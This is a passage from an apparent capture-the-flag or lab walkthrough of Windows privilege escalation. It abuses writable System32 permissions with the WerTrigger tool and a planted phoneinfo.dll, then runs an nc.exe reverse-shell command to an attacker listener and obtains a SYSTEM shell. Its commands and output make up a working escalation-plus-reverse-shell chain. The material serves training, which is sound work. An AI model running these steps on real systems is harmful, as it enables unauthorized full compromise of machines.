           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
Let's use WerTrigger from https://github.com/sailay1996/WerTrigger to acquire a SYSTEM shell.

To set it up we need to:

Copy phoneinfo.dll to *C:\Windows\System32*
Place Report.wer file and WerTrigger.exe in a same directory.
Run WerTrigger.exe.
C:\xampp\htdocs\uploads\enox>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CCC2-BF17

 Directory of C:\xampp\htdocs\uploads\enox

10/10/2021  07:25 PM    <DIR>          .
10/10/2021  07:25 PM    <DIR>          ..
10/10/2021  07:23 PM             9,252 Report.wer
10/10/2021  07:23 PM            15,360 WerTrigger.exe
               2 File(s)         24,612 bytes
               2 Dir(s)  50,123,882,496 bytes free

C:\xampp\htdocs\uploads\enox>WerTrigger.exe
WerTrigger.exe
c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
Note : WerTrigger.exe will not produce any output and will just wait for you to type the instructions you want to perform.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49998
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname 
whoami && hostname 
nt authority\system
SERVER

C:\Windows\system32>
We now have system level access on the target machine!
```

</details>